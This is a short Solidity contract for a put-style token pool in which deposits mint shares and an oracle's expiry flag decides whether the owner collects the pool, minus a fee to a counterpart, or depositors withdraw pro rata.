//SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

import "./standards/IERC20.sol";
import "./standards/Context.sol";
import "./standards/SafeMath.sol";
import "./standards/Address.sol";
import "./standards/ERC20.sol";
import "./standards/Ownable.sol";
import "./EverestStandardOracle.sol";
import "./Against.sol";

contract PUTStandard is ERC20("TokenPUT0831", "TOKENDOWN0831"), EverestStandardOracle, Against {
    using SafeMath for uint256;
    IERC20 public token;
    
    constructor(IERC20 _token) public {
        token = _token;
    }

    function deposit(uint256 _amount) public {
        if (_Expired == 0) {
            _mint(msg.sender, _amount);
            token.transferFrom(msg.sender, address(this), _amount);
        }
    }
    
    function lost() public onlyOwner {
        uint256 OwnerFee = token.balanceOf(address(this)).div(40);
        uint256 totalToken = token.balanceOf(address(this)).sub(OwnerFee);
        if (_Expired == 1) {
        token.transfer(_Opposite, OwnerFee);
        token.transfer(msg.sender, totalToken);
        }
    }
    
    function withdraw(uint256 _share) public {
        uint256 totalAmount = totalSupply();
        uint256 fair = _share.mul(token.balanceOf(address(this))).div(totalAmount);
        if (_Expired == 2) {
            _burn(msg.sender, _share);
            token.transfer(msg.sender, fair);
        }
    }
}
